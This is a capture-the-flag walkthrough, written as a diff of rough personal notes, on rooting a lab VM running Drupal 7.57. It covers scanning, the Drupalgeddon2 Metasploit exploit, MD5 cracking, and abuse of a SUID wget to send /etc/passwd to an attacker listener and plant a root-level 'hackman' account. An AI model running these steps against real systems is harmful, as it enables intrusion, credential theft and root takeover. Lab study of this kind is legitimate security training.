@@ -1,0 +1,226 @@
+[*]
+1. discover host: nmap -sn 172.16.16.0/24
+MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
+Nmap scan report for 172.16.16.2
+Host is up (0.00028s latency).
+MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
+Nmap scan report for 172.16.16.3
+Host is up (0.00026s latency).
+MAC Address: 08:00:27:69:B5:42 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 172.16.16.27
+[*]
+2. quck port scan: nmap -sS 172.16.16.27
+Host is up (0.00012s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+[*]
+3. Banner check SSH
+oot@hostmachine:~# ssh 172.16.16.27
+The authenticity of host '172.16.16.27 (172.16.16.27)' can't be established.
+ECDSA key fingerprint is SHA256:hXngPbMM4R/BRWkpJVUWY6uRCJulK86bg2MOzFRgl5s.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '172.16.16.27' (ECDSA) to the list of known ho
+
+**no banner**
+[*]
+4. HTTP enumeration with nikto: nikto -h 172.16.16.27
+ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 59633974a1f12, mtime: gzip
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7889 requests: 0 error(s) and 7 item(s) reported on remote host
++ End Time:           2019-12-13 23:44:52 (GMT-6) (52 seconds)
+[*]
+5. dir enumeration: dirb http://172.16.16.27/ -a linux -w /usr/share/wordlists/dirb/big.txt
+-a linux (user-agent) -w (wordlist)
+**found alot of urls with /drupal
+[*]
+6. This appears to be a drupal "droope/droople" site. a good tool for this is droopescan
+cd Downloads && git https://github.com/droope/droopescan.git
+#if pip not installed run apt-get install python3-pip
+apt-get install python3-sphinx
+pip3 install sphinx
+pip3 install dscan
+pip3 install cement
+pip3 install pystache
+pip3 install -U droopescan
+
+7. Run droopescan: droopescan scan drupal -u http://172.16.16.27/drupal
+root@hostmachine:~/vulnhubdb# droopescan scan drupal -u http://172.16.16.27/drupal
+[+] Plugins found:                                                              
+    image http://172.16.16.27/drupal/modules/image/
+    profile http://172.16.16.27/drupal/modules/profile/
+    php http://172.16.16.27/drupal/modules/php/
+
+[+] Themes found:
+    seven http://172.16.16.27/drupal/themes/seven/
+    garland http://172.16.16.27/drupal/themes/garland/
+
+[+] Possible version(s):
+    7.57
+
+[+] Possible interesting urls found:
+    Default changelog file - http://172.16.16.27/drupal/CHANGELOG.txt
+
+[+] Scan finished (0:00:05.986432 elapsed)
+
+
+8. searchsploit drupal 7.5
+rupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                            | exploits/php/webapps/44557.rb
+Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                         | exploits/php/webapps/44542.txt
+Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution       
+
+9. msfconsole
+use exploit/unix/webapp/drupal_drupalgeddon2
+set TARGETURI /drupal
+set RHOST 172.16.16.27
+set LHOST 172.16.16.4
+exploit -j -z
+
+10. Iteract with the session
+sessions -i 1
+shell
+
+11. Found file /home/james/user.txt
+cat user.txt                                  
+  | |                                 
+ / __) ______  _   _  ___   ___  _ __ 
+ \__ \|______|| | | |/ __| / _ \| '__|
+ (   /        | |_| |\__ \|  __/| |   
+  |_|          \__,_||___/ \___||_|   
+MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
+
+12. Crack pass: echo 'bae11ce4f67af91fa58576c1da2aad4b' > flag.hash
+root@hostmachine:~# john flag.hash --format=Raw-MD5 -w /usr/share/wordlists/rockyou.txt
+Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 52 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=12
+Press 'q' or Ctrl-C to abort, almost any other key for status
+emerald          (?)
+
+13. su - james
+su: must be run from a terminal
+
+14. move to interactive terminal:
+python3 -c "import pty;pty.spawn('/bin/sh')"
+
+15. su - james && su - root
+**not the right password!?**
+
+16.  cat /etc/cron.dain^?ly/passwd
+cat /etc/cron.daily/passwd
+#!/bin/sh
+
+cd /var/backups || exit 0
+
+for FILE in passwd group shadow gshadow; do
+        test -f /etc/$FILE              || continue
+        cmp -s $FILE.bak /etc/$FILE     && continue
+        cp -p /etc/$FILE $FILE.bak && chmod 600 $FILE.bak
+done
+
+17. ls /var/backups **no passwd file**
+
+18. ls
+cat alexander.txt 
+KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4gKysrPF0gPisrKy4KLS0tLS0gLS0tLjwgKysrWy0gPisrKzwgXT4rKysgKysuPCsgKysrKysgK1stPi0gLS0tLS0gLTxdPi0gLS0tLS0gLS0uPCsKKytbLT4gKysrPF0gPisrKysgKy48KysgKysrWy0gPisrKysgKzxdPi4gKysuKysgKysrKysgKy4tLS0gLS0tLjwgKysrWy0KPisrKzwgXT4rKysgKy48KysgKysrKysgWy0+LS0gLS0tLS0gPF0+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS4rLi0gLS0tLisKKysuPA==
+
+19. Decode string further
++++++ +++++ [->++ +++++ +++<] >++++ ++.-- ----- --.<+ ++[-> +++<] >+++.
+----- ---.< +++[- >+++< ]>+++ ++.<+ +++++ +[->- ----- -<]>- ----- --.<+
+++[-> +++<] >++++ +.<++ +++[- >++++ +<]>. ++.++ +++++ +.--- ---.< +++[-
+>+++< ]>+++ +.<++ +++++ [->-- ----- <]>-. <+++[ ->--- <]>-- -.+.- ---.+
+++.<
+**looks like ook or brainfuck. But I couldn't make heads or tails of it.**
+
+20. Upload linenum.sh
+chmod u+x linenum.sh
+./linenum.sh
+[+] Possibly interesting SUID files:
+-rwsr-xr-x 1 root root 506200 May  9  2018 /usr/bin/wget
+Ubuntu 4.4
+
+21. POST /etc/passwd
+**listen: nc -nvlp 80
+**POST: wget --post-file=/etc/passwd 172.16.16.4
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+messagebus:x:107:111::/var/run/dbus:/bin/false
+uuidd:x:108:112::/run/uuidd:/bin/false
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+james:x:1000:1000:james,,,:/home/james:/bin/bash
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false
+
+22. Save as file: passwd. And edit user: echo "hackman:$(openssl passwd -1 -salt hackman password):0:0:root:/root:/bin/bash" >> passwd
+
+23. save passwd file
+start http server: python -m SimpleHTTPServer 80
+download file:
+  cd /etc
+  
+
+23. login as hackman: 
+u - hackman
+su: must be run from a terminal
+
+24. upgrade terminal
+python3 -c "import pty;pty.spawn('/bin/sh')"
+
+
+22. su - hackman
+cat root.txt
+root.txt
+root@hackNos:~# cat o^?root.txt
+cat root.txt
+    _  _                              _   
+  _| || |_                           | |  
+ |_  __  _|______  _ __  ___    ___  | |_ 
+  _| || |_|______|| '__|/ _ \  / _ \ | __|
+ |_  __  _|       | |  | (_) || (_) || |_ 
+   |_||_|         |_|   \___/  \___/  \__|
+                                          
+                                          
+
+MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
+
+Author : Rahul Gehlaut
+
+Linkedin : https://www.linkedin.com/in/rahulgehlaut/
+
+Blog : www.hackNos.com
+
+
+
+
